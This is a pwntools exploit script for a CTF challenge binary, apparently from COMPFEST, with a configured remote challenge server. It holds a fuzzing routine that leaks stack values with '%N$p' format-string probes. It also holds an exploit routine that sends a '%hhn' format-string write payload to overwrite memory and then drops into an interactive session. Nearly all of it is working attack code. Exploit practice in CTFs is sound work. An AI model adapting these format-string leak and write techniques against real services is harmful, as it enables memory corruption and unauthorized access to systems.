#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'challenges.ctf.compfest.id', 20007

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# breakrva 0x13f3
breakrva 0x1484
breakrva 0x149d
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall 
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def fuzz():
    global io

    context.log_level = 'warning'
    for idx in range(1, 40):
        io = initialize()
        io.sendlineafter(b':', b'4')
        io.sendafter(b':', f'AAAAAAAA||%{idx}$p'.encode()) # offset at 10

        io.recvuntil(b'menginput: ')
        try:
            log.warning(f"BUFFER[{idx}] = %s", io.recvall())
        except:
            print('Failed')

        io.close()

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b':', b'10')
    io.sendafter(b':', f'%{0xbf}c%9$hhn'.encode())

    io.interactive()
    
if __name__ == '__main__':
    # fuzz()
    exploit()
